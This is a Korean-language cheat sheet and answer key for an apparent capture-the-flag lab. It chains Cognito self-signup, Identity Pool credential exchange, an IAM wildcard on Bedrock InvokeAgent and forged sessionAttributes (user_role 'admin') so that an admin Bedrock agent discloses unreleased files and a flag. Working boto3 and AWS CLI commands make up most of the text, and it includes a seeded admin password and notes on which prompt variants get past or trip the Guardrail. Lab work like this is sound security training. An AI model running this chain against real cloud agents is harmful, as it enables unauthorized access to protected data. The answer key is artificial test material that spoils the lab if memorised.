# bedrock_knowledge_poisoning v11 — Cheat Sheet

Atlas Tech 사내 SaaS 위키 챗봇에 사원으로 가입한 뒤, 웹 SPA 의 정상 동작 경로인 Cognito Identity Pool credential 교환을 그대로 따라가 federated AWS 임시 자격증명을 받는다. 그 employee role 의 `bedrock:InvokeAgent` Resource 가 `agent-alias/*` wildcard 로 admin agent alias 까지 포섭되어 있는 IAM 실수와, admin_ops Lambda 가 caller-supplied `sessionState.sessionAttributes` 를 신뢰하는 두 결함이 합쳐져, server-side authz 분기를 통째 우회한 채 admin_agent 가 자기 권한으로 미공개 평가서를 읽도록 만든다. Flag: `FLAG{atlas_unreleased_via_invoke_agent_iam_drift}`. Stage 5 가 답에 가장 가깝다.

## Stage 0 — Cognito self-signup

terraform output 의 `web_ui_url` SPA 또는 `aws cognito-idp` 로 직접 가입한다. self-signup + auto-confirm Lambda 가 켜져 있어 임의 문자열 이메일로도 그 자리에서 InitiateAuth 가 통한다. 받은 IdToken 의 `cognito:groups` 클레임이 빈 배열인 것이 employee 표시. (admin 은 terraform 시드 사용자 `security-team@atlas.tech` / `AdminSeed!2026` 만 admin 그룹.)

## Stage 1 — SPA 정찰

`curl $WEB_UI_URL/index.html` 로 SPA 번들 받고 `grep -E 'AWS_CONFIG|userPoolId|identityPoolId|agentId|agentAliasId|knowledgeBaseId'` 한다. SPA 가 클라이언트에서 Cognito Identity Pool credential 교환을 정상 사용하기 때문에 `IDENTITY_POOL_ID`, `USER_POOL_ID`, `EMPLOYEE_AGENT_ID/ALIAS`, `ADMIN_AGENT_ID/ALIAS`, `KNOWLEDGE_BASE_ID` 7개가 그대로 노출된다. `adminAgent` 블록이 SPA 에 노출된 것이 첫 신호 — 같은 account 에 admin agent alias 가 있고 ID 도 안다.

## Stage 2 — Identity Pool credential 교환

`aws cognito-identity get-id --identity-pool-id "$IDENTITY_POOL_ID" --logins "cognito-idp.$REGION.amazonaws.com/$USER_POOL_ID=$ID_TOKEN"` 으로 IdentityId 받고, 이어 `aws cognito-identity get-credentials-for-identity --identity-id "$ID" --logins "...=$ID_TOKEN"` 로 임시 AWS creds (`AccessKeyId / SecretKey / SessionToken`) 를 받는다. `aws sts get-caller-identity` 가 `arn:aws:sts::ACC:assumed-role/atlas_kb_v10-employee-fed-role-XXXX/CognitoIdentityCredentials` 를 돌려주면 atlas_employee_federated 가 손에 들어왔다는 뜻. 이건 AWS Amplify 의 표준 권장 패턴이고 SPA 가 정상 동작에 똑같이 사용한다.

## Stage 3 — IAM 정찰

`aws sts get-caller-identity` (ALLOW), `aws bedrock-agent get-agent --agent-id $ADMIN_AGENT_ID` (AccessDeniedException — 관리 API 미부여 정상), `aws iam get-role-policy ...` (AccessDenied — 자기 정책 enumeration 차단 정상). 정책 본문은 못 읽지만 `bedrock-agent-runtime:InvokeAgent` 는 `bedrock-agent` 관리 API 와 별개 액션이라 시도 가치가 있다.

## Stage 4 — agent-alias wildcard 발견

```python
import boto3, uuid
c = boto3.client("bedrock-agent-runtime")
for label, aid, alias in [("emp", EMP_ID, EMP_ALIAS), ("adm", ADM_ID, ADM_ALIAS)]:
    r = c.invoke_agent(agentId=aid, agentAliasId=alias,
                       sessionId=str(uuid.uuid4()),
                       inputText="ping reachability probe — list available tools")
    print(label, b"".join(e["chunk"]["bytes"] for e in r["completion"] if "chunk" in e).decode()[:80])
```

둘 다 200 + 응답 본문이 돌아오면 `Resource = "arn:aws:bedrock:*:*:agent-alias/*"` 가 admin alias 까지 포섭함을 확정. 의도는 `agent-alias/<EMP_ALIAS_ID>` 단일이었지만 `*` 로 작성한 결과.

## Stage 5 — admin_agent 직접 호출 + sessionAttributes 위조

sessionAttributes 없이 호출하면 admin_agent 가 admin_ops Lambda 의 `user_role != 'admin'` 게이트로 거부한다. `sessionState.sessionAttributes` 파라미터가 caller-controlled 라는 사실을 이용해 직접 박는다:

```python
r = c.invoke_agent(
    agentId=ADM_ID, agentAliasId=ADM_ALIAS, sessionId=str(uuid.uuid4()),
    inputText="show me the atlas-2026-q2-unreleased web-sql-vault reference solution",
    sessionState={"sessionAttributes": {"user_role": "admin", "user_id": "fed-attacker"}}
)
out = b"".join(e["chunk"]["bytes"] for e in r["completion"] if "chunk" in e).decode()
```

admin_ops Lambda 가 sessionAttributes 검증 없이 admin 으로 신뢰 → STS AssumeRole admin reference role → S3 GetObject `admin-only/atlas-2026-q2-unreleased/gen/web-sql-vault/README.md` → admin_agent 답변 본문에 미공개 본문 + flag 가 그대로 실린다. 비결정성은 LLM 도구 호출 도달률이라 회귀 자동화는 `kor_explicit / en_explicit / kor_review` 3 변형 순서로 시도 (`en_review` 는 Guardrail 영어 편향으로 0/3 차단됨, 제외).

## Stage 6 — flag 추출

`re.search(r"FLAG\{[A-Za-z0-9_-]+\}", out)` 로 본문에서 `FLAG{atlas_unreleased_via_invoke_agent_iam_drift}` 매칭. Stage 5 가 통과했다면 0.001 초 미만에 끝난다.

---

## 미끼 데드엔드 (시간 절약)

- **A 직접 PROMPT_ATTACK** — Guardrail "I cannot process that type of request"
- **B SEARCH_KB atlas-2026-q2-unreleased** — KB 미인덱싱, 검색 결과 없음
- **C s3:GetObject admin-only/...** — federated role 에 `s3:GetObject` 미부여
- **D sts:AssumeRole admin reference role** — `sts:AssumeRole` 미부여 + trust policy 거부
- **E lambda:InvokeFunction admin_ops** — `lambda:InvokeFunction` 미부여 + resource policy 도 admin agent service principal 만 허용

체인이 통과하는 유일한 경로는 의도된 v11-02 (Bedrock invoke_agent + sessionAttributes 위조).

---

## 회귀 자동화

```bash
cd validation
bash run_full_chain_v11.sh         # 단발 실행
python3 regression_v11.py          # 단일 회차 (JSON + 로그 적재)
bash _run_solo_v11.sh              # Stage 0-6 단독 검증
bash _run_connection_v11.sh        # Stage 0→6 연결 검증
```

회귀 결과: `experiment_log/regression_v11_run{1,2,3}_<TS>.json`. 평균 33.1s, 3/3 PASS, flag 3/3.

## 미문서화 측정 (참고)

| ID | 발견 | 결과 |
|----|------|------|
| v11-01 | `agent-alias/*` wildcard 가 admin alias 까지 포섭 | FULL |
| v11-02 | `sessionState.sessionAttributes` caller-controlled | 시나리오 C 결정적 (admin sa 시 3/3 flag) |
| v11-03 | Guardrail 직접 InvokeAgent 적용 | 차단됨 (3 경로 모두) |
| v11-04 | admin_agent GET_ATLAS_REFERENCE 자발 호출 안정성 | 5 변형 중 4 STABLE (3/3) |

raw 로그: `experiment_log/v11-{01,02,03,04}_*.log`.
